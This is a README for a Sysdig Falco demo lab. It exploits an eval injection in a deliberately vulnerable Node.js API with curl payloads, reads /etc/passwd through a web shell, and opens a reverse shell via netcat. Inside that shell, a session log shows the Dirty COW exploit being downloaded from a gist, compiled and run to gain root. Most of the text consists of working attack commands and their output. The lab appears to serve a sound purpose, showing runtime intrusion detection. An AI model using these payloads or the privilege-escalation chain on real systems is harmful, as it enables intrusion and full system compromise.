# falco-demo
This builds an scenario for showing Sysdig Falco, exploiting incorrect input passed to eval in NodeJS and the dirtyc0w to get root access. You can use this Vagrant image https://atlas.hashicorp.com/bencer/boxes/dirtycow.

run the scenario:
```
vagrant init bencer/dirtycow
vagrant up
vagrant ssh
cd /vagrant/nodejs/bad-rest-api
docker-compose up
```

discover vulnerability:

`curl -X POST --data year="2016" http://localhost:8080/api/days-from-year/`
`curl -X POST --data year="res.write('foobar')" http://localhost:8080/api/days-from-year/`

try1 (not working, new listening ports not exposed):

`curl -X POST --data "@shell.js" http://localhost:8080/api/days-from-year/`
`curl "http://localhost:8000/?cmd=cat%20/etc/passwd"`

try2:

`nc -lvp 9999`
`curl -X POST --data "@rshell.js" http://localhost:8080/api/days-from-year/`

```
Listening on [0.0.0.0] (family 0, port 9999)
Connection from [172.18.0.3] port 9999 [tcp/*] accepted (family 2, sport 43398)
id
uid=999(node) gid=999(node) groups=999(node)
pwd
/home/node
curl https://gist.githubusercontent.com/joshuaskorich/86c90e12436c873e4a06bd64b461cc43/raw/71db45f5b97c8e4ed00f1193e578a77f90dabbdd/cowroot.c > cowroot.c
gcc cowroot.c -o cowroot -pthread
cowroot.c: In function 'procselfmemThread':
cowroot.c:107:17: warning: passing argument 2 of 'lseek' makes integer from pointer without a cast
         lseek(f,map,SEEK_SET);
                 ^
In file included from cowroot.c:27:0:
/usr/include/unistd.h:334:16: note: expected '__off_t' but argument is of type 'void *'
 extern __off_t lseek (int __fd, __off_t __offset, int __whence) __THROW;
                ^
./cowroot
/bin/sh: 1: cannot create /proc/sys/vm/dirty_writeback_centisecs: Read-only file system
id
uid=0(root) gid=999(node) groups=999(node)
```

note: for increased stability run this in the VM before running the exploit, Docker mounts /proc/sys in ro so the exploit tends to freeze the VM.
```
sudo -s
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
```


